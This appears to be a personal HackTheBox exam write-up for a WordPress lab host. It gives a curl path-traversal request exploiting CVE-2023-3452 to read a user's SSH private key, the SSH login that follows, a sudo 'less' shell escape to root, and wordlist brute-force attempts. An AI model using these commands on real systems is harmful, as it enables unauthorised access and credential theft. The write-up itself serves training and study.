---
title: "WEB01"
category: "labs"
tags: []
excerpt: ""
date: "2026-04-30"
---

---
## Target Information

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Target Information:</span></summary>
<div class="callout-body">

```
IP Address: 10.129.17.44 (changed multiple times during exam due to network resets)
Hostname:   www.luminex.htb
OS:         Linux (Ubuntu — nginx/PHP-FPM)
Platform:   HackTheBox CJCA Exam
```

</div>
</details>

---
## Timeline

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Timeline:</span></summary>
<div class="callout-body">

```
2026-04-25 10:52 — Began WEB01 enumeration
2026-04-25 ~11:00 — Nmap identified ports 22, 80, 443, 8009, 8080
2026-04-25 ~11:15 — WPScan first run — no plugin results (hotel internet issues)
2026-04-25 ~11:30 — Ghostcat/AJP rabbit hole investigated; confirmed dead end
2026-04-25 ~12:00 — WPScan with aggressive detection + API token found Site Import v1.0.1 plugin
2026-04-25 ~12:10 — CVE-2023-3452 LFI exploited; cameron SSH key exfiltrated
2026-04-25 ~12:15 — SSH as cameron; sudo -l revealed privesc vector
2026-04-25 ~12:20 — Root via sudo less shell escape
```

</div>
</details>

---
## Enumeration

### Port Scan Results

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Port Scan Results:</span></summary>
<div class="callout-body">

```
nmap -oN WEB01-TCP-Ports -T5 -sT -sV -p 22,80,443,8009,8080 -Pn <target-ip>

PORT     STATE SERVICE
22/tcp   open  ssh     OpenSSH
80/tcp   open  http    nginx (redirects to HTTPS)
443/tcp  open  https   nginx — WordPress (www.luminex.htb)
8009/tcp open  ajp13   Apache JServ (AJP connector — Ghostcat dead end on this stack)
8080/tcp open  http    HTTP alternate
```

</div>
</details>

### Service Enumeration

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Service Enumeration:</span></summary>
<div class="callout-body">

```
# Enumerate WordPress users
wpscan --url https://www.luminex.htb -e u --disable-tls-checks

# Aggressive plugin detection — required to reveal Site Import plugin; add API token for CVE data
wpscan --url https://www.luminex.htb -e p --disable-tls-checks --plugins-detection aggressive -t 100 --api-token <api-token>

# Result: Site Import v1.0.1 plugin identified — vulnerable to CVE-2023-3452 (unauthenticated LFI)
```

</div>
</details>

---
## Foothold

### Vulnerability Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vulnerability Identified:</span></summary>
<div class="callout-body">

```
CVE-2023-3452 — Site Import v1.0.1 WordPress Plugin Unauthenticated Local File Inclusion
The url parameter in /wp-content/plugins/site-import/admin/page.php is unsanitized,
allowing unauthenticated path traversal to read arbitrary files as www-data.
```

</div>
</details>

### Exploitation Steps

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Exploitation Steps:</span></summary>
<div class="callout-body">

```
# 1. Use LFI to read cameron's SSH private key via url path traversal
curl -k "https://www.luminex.htb/wp-content/plugins/site-import/admin/page.php?url=../../../../../../../../../home/cameron/.ssh/id_rsa"

# 2. Save raw key output (returned with spaces instead of newlines)
vim ~/.ssh/id_rsa2

# 3. Fix newline formatting and set correct permissions
sed 's/ /\n/g' ~/.ssh/id_rsa2 > ~/.ssh/id_rsa3 && chmod 600 ~/.ssh/id_rsa3

# 4. Connect as cameron
ssh -i ~/.ssh/id_rsa3 cameron@<target-ip>
```

</div>
</details>

---
## Privilege Escalation

### Vector Identified

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Vector Identified:</span></summary>
<div class="callout-body">

```
Sudo misconfiguration — cameron can run /usr/bin/less on auth.log as root with NOPASSWD.
less supports shell escape via the ! operator, spawning a root shell.

sudo -l output:
(ALL) NOPASSWD: /usr/bin/less /var/log/auth.log
```

</div>
</details>

### Steps Taken

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Steps Taken:</span></summary>
<div class="callout-body">

```
# 1. Check sudo permissions
sudo -l

# 2. Open auth.log with less as root
sudo /usr/bin/less /var/log/auth.log

# 3. Shell escape from inside less
!/bin/bash
# Result: root shell
```

</div>
</details>

---
## Flags

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Flags:</span></summary>
<div class="callout-body">

```
User (cameron): 88f61d6ce3d26d2c89b9260bd017e08d
Root:           d6e3e11b11a89cc678b116ef0468f929
```

</div>
</details>

---
## Loot

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Loot:</span></summary>
<div class="callout-body">

```
cameron's SSH private key — /home/cameron/.ssh/id_rsa (exfiltrated via LFI)
WordPress admin hash — captured post-compromise from admin interface
```

</div>
</details>

---
## Rabbit Holes

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Rabbit Holes:</span></summary>
<div class="callout-body">

```
- Ghostcat (CVE-2020-1938) — port 8009 (AJP) was open but WEB01 runs nginx/WordPress,
not Apache Tomcat. AJP connector was present but unexploitable on this stack.
Lesson: confirm the web server software before chasing port-specific CVEs.

- WPScan password brute force — ran rockyou.txt and fasttrack.txt via both xmlrpc
and wp-login attack modes repeatedly. None succeeded. The admin password was not in
either wordlist. The attack vector was the plugin, not credentials.

- Repeated WPScan runs without aggressive mode — hotel internet instability caused
aggressive plugin detection to silently return no results on early runs. Went
through multiple other attack paths before re-running with --plugins-detection
aggressive and --api-token, which immediately revealed the Site Import v1.0.1 plugin.
```

</div>
</details>

---
## Lessons Learned

<details class="callout callout-info">
<summary class="callout-title"><span class="callout-icon">ℹ</span><span>Lessons Learned:</span></summary>
<div class="callout-body">

```
- Run WPScan aggressive plugin detection with an API token first. Do not move on until
plugin enumeration returns clean output with CVE data visible.
- Verify the full web stack before chasing port-based exploits — AJP/Ghostcat requires
Apache Tomcat specifically. nginx serving WordPress cannot be exploited via AJP.
- Document enumeration results as they happen. Network resets during this exam reset
IPs, and without current notes it was easy to re-run scans already done.
- Deprioritize wordlist brute force in CTF/exam contexts — enumeration-based attack
vectors (plugins, services, misconfigs) are almost always the intended path.
```

</div>
</details>

---
## Related Concepts
- [WordPress](/knowledge/Web-Security/WordPress)
- [HTTP & HTTPS](/knowledge/Networking/HTTP-HTTPS)

## Related Techniques
- [WordPress Attacks](/techniques/WordPress-Attacks)

## Related Playbooks
- [Linux Pentest Playbook](/playbooks/Linux-Pentest-Playbook)

## Related Tools
- [WPScan](/tools/Web-Testing/WPScan)
- [Nmap](/tools/Enumeration/Nmap)

---
## References / Images
- Ghostcat AJP Exploration
- Site Import v1.0.1 Exploit (CVE-2023-3452)
- CVE-2023-3452 LFI Exploit
- User Flag via LFI
- SSH Key Raw Output (Unformatted)
- SSH Key After sed Formatting
- User Flag with Date
- cameron .bash_history Loot
- Root Flag
- WordPress Admin Hash
- CVE-2023-3452: https://www.exploit-db.com/exploits/51826
- CVE-2020-1938 (Ghostcat): https://nvd.nist.gov/vuln/detail/CVE-2020-1938
